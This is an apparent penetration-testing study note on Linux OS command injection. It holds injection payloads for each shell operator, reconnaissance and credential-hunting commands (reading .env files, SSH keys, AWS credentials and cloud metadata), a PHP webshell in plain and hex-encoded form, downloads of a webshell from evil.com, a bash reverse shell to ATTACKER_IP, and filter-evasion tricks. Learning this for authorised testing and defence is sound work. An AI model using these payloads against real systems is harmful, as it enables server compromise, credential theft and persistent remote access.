---
tags: [vapt, command-injection, intermediate]
difficulty: intermediate
module: "08 - Command Injection"
topic: "08.02 OS Command Injection — Linux"
portswigger_labs: ["Command injection"]
---

# 08.02 — OS Command Injection — Linux

## Linux Shell Injection Operators

```
OPERATOR    BEHAVIOR                           EXAMPLE
---------   ---------                          -------
;           Run next command regardless         cmd1; cmd2
|           Pipe stdout of cmd1 to cmd2         cmd1 | cmd2
||          Run cmd2 ONLY if cmd1 fails         cmd1 || cmd2
&           Run cmd1 in background, then cmd2  cmd1 & cmd2
&&          Run cmd2 ONLY if cmd1 succeeds      cmd1 && cmd2
`cmd`       Command substitution (backtick)     ping `cmd`
$(cmd)      Command substitution (modern)       ping $(cmd)
\n / %0a    Newline (new command)               cmd1\ncmd2
```

---

## Injection Examples for Each Operator

```bash
# SCENARIO: Vulnerable parameter ?host=USER_INPUT → system("ping -c 1 " + host)

# SEMICOLON (most common):
?host=127.0.0.1;id
→ ping -c 1 127.0.0.1;id
→ Runs ping, THEN runs id
OUTPUT: ping results + uid=33(www-data)...

# PIPE:
?host=127.0.0.1|id
→ ping -c 1 127.0.0.1|id
→ Pipes ping output into id (id ignores stdin, still executes)
OUTPUT: uid=33(www-data)...

# OR-OPERATOR (useful when first command errors):
?host=invalid_host||id
→ ping -c 1 invalid_host||id
→ ping fails → id runs
OUTPUT: uid=33(www-data)...

# AND (useful when first command succeeds):
?host=127.0.0.1&&id
→ ping -c 1 127.0.0.1&&id
→ ping succeeds → id runs
OUTPUT: ping results + uid=33(www-data)...

# COMMAND SUBSTITUTION:
?host=`id`
→ ping -c 1 `id`
→ Shell runs id, substitutes output → ping gets garbage → ping may fail but id ran!

?host=$(id)
→ ping -c 1 $(id)
→ Same as backtick

# NEWLINE (URL-encoded):
?host=127.0.0.1%0aid
→ ping -c 1 127.0.0.1\nid
→ Shell sees two separate lines!
```

---

## Reconnaissance Commands (After Initial Injection)

```bash
# WHO AM I AND WHERE AM I:
id                          → current user (uid=33(www-data))
whoami                      → username only (www-data)
pwd                         → current directory (/var/www/html)
hostname                    → server name (webserver01)
uname -a                    → Linux version, kernel
cat /etc/os-release         → OS distribution (Ubuntu 20.04)
env                         → all environment variables (may have DB creds!)
printenv                    → same as env

# WHAT PRIVILEGES DO I HAVE?
id                          → check for root (uid=0)
sudo -l                     → what can I sudo without password?
cat /etc/sudoers            → full sudo rules (if readable)
ls -la /etc/sudoers.d/      → sudo drop-in rules

# WHAT'S RUNNING?
ps aux                      → all running processes
netstat -tulpn              → listening ports (internal services!)
ss -tulpn                   → modern netstat alternative
cat /etc/hosts              → internal hostnames/IPs

# FILE SYSTEM:
ls -la /var/www/html/       → web root files
find / -name "*.env" 2>/dev/null    → find .env files
find / -name "config.php" 2>/dev/null
find / -name "*.conf" 2>/dev/null | head -20
cat /etc/passwd             → system users list
cat /etc/shadow             → password hashes (if root!)
```

---

## Finding Sensitive Files

```bash
# DATABASE CREDENTIALS:
cat /var/www/html/config.php
cat /var/www/html/.env
cat /var/www/html/wp-config.php         ← WordPress
cat /var/www/html/config/database.yml   ← Rails
cat /var/www/html/application.properties
cat /home/*/config*

# PRIVATE KEYS:
find / -name "*.pem" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find /home -name ".ssh" -type d 2>/dev/null
cat /root/.ssh/id_rsa

# AWS CREDENTIALS:
cat /home/*/.aws/credentials
cat /root/.aws/credentials
env | grep -i aws

# CLOUD METADATA (from server):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/  ← AWS
curl http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"

# LOOK IN COMMON DIRS:
ls /opt/
ls /srv/
ls /etc/nginx/sites-enabled/
ls /etc/apache2/sites-enabled/
cat /etc/nginx/nginx.conf
```

---

## Writing Files (Escalating to RCE)

```bash
# WRITE A PHP WEBSHELL:
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# IF > DOESN'T WORK (filtered):
echo '3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e' | xxd -r -p > /var/www/html/shell.php
# (hex-encoded version of the php shell)

# USE TRE TO DOWNLOAD:
wget https://evil.com/shell.php -O /var/www/html/shell.php
curl -o /var/www/html/shell.php https://evil.com/shell.php

# CHECK IF WEBSHELL WORKED:
curl "https://target.com/shell.php?cmd=id"
```

---

## Escaping Quotes and Spaces

```bash
# IF SPACES ARE FILTERED:
${IFS}          → Internal Field Separator (defaults to space!)
cat${IFS}/etc/passwd
cat${IFS}../../../etc/passwd

# TAB AS SPACE ALTERNATIVE:
cat	/etc/passwd     ← literal tab (sometimes works)
cat%09/etc/passwd   ← URL-encoded tab

# BRACE EXPANSION (no space needed):
{cat,/etc/passwd}   ← some shells support this

# ENVIRONMENT VARIABLES:
$IFS vs ${IFS}
$HOME → /root (if root)

# IF QUOTES ARE FILTERED:
# Don't use quotes at all:
cat /etc/passwd    ← no quotes needed for simple paths!
```

---

## Common Vulnerable Functions (By Language)

```bash
# FINDING VULNERABLE CODE IN PHP:
grep -r "system\|exec\|shell_exec\|passthru\|popen\|proc_open" /var/www/html/ --include="*.php"

# IN PYTHON:
grep -r "os.system\|subprocess\|popen\|shell=True" /var/www/ --include="*.py"

# IN NODE.JS:
grep -r "exec\|execSync\|spawn" /var/www/ --include="*.js" | grep "shell\|sh"
```

---

## Real-World Example: Network Diagnostic Tool

```
VULNERABLE APP:
  Web form: "Enter hostname to ping:"
  [8.8.8.8] [PING]

  POST /network/ping HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded
  
  host=8.8.8.8

INJECTION:
  host=8.8.8.8;id

RESPONSE:
  PING 8.8.8.8 (8.8.8.8): 56 data bytes
  64 bytes from 8.8.8.8: icmp_seq=0 ttl=55 time=12.3 ms
  
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ↑ INJECTED COMMAND OUTPUT!

ESCALATION:
  host=8.8.8.8;cat /etc/passwd
  host=8.8.8.8;cat /var/www/html/.env
  host=8.8.8.8;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## Testing Checklist

```
□ Try semicolon: ;id
□ Try pipe: |id
□ Try OR: ||id
□ Try AND: &&id
□ Try newline: %0aid
□ Try backtick: `id`
□ Try subshell: $(id)
□ Check if spaces work — if not, use ${IFS}
□ Try without first value: just ;id (empty first arg)
□ URL-encode operators: %3B id (;), %7C id (|)
□ Try blind timing: ;sleep 5
```

---

## Related Notes
- [[01 - What is Command Injection]] — introduction
- [[03 - OS Command Injection Windows]] — Windows equivalent
- [[04 - Blind Command Injection]] — no-output injection
- [[08 - Chaining Operators]] — operator reference
- [[10 - Command Injection to Reverse Shell]] — escalation
